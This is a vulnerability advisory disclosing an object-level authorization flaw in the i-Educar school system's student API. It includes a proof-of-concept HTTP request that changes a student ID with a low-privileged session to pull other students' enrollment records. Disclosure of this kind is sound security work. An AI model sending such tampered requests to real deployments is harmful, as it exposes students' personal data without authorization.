# Broken Object Level Authorization (BOLA) allows enumeration of student records via /module/Api/aluno

### Summary

A Broken Object Level Authorization (BOLA) vulnerability was identified in the `/module/Api/aluno` endpoint of the **i-Educar** application.  
This flaw allows low-privileged users (e.g., standard student/responsible accounts) to retrieve enrollment (`matriculas`) information of students outside their scope, exposing Personally Identifiable Information (PII) without proper authorization checks.

---

### Details

**Vulnerable Endpoint:**  
`GET /module/Api/aluno`

The application fails to enforce **object-level authorization** when handling this endpoint. As a result, any authenticated user can manipulate the request values to access sensitive information (names, IDs, enrollment status) of students.

---
### Proof of Concept (PoC)

1. Authenticate as a non-privileged user.

<img width="1380" height="528" alt="Pasted image 20250821225155" src="https://github.com/user-attachments/assets/abcb3516-444a-48cd-8af4-563276d1b952" />
<img width="846" height="616" alt="Pasted image 20250821225232" src="https://github.com/user-attachments/assets/ac9b27b6-4a94-4bbc-9e07-2a2db6fc1548" />


2. Send the following request:

```
GET /module/Api/aluno?&oper=get&resource=matriculas&aluno_id=206 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://localhost/intranet/educar_aluno_det.php?cod_aluno=206
Cookie: i_educar_session=[LOW PRIVILEGED COOKIE]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

```

<img width="1345" height="676" alt="Pasted image 20250821224929" src="https://github.com/user-attachments/assets/3068c382-fb51-4bb6-9846-5ee9ebd27d1d" />


3. We could observe that informations about the student were returned.

---

### Impact

This vulnerability exposes **Personally Identifiable Information (PII)** of students, including:

- Names
    
- Class, course, and enrollment status
    
- Institutional relationships
    

**Potential risks include:**

- Unauthorized data harvesting of all students across institutions
    
- Privacy violations (LGPD compliance risk)
    
- Social engineering opportunities by attackers
    
- Reputational damage for the institution
    

**Severity:** High

- Low privileges required
    
- High impact (sensitive data exposure)
    
- Easy to exploit with parameter tampering


## Discoverer

[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)

by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)
    

---
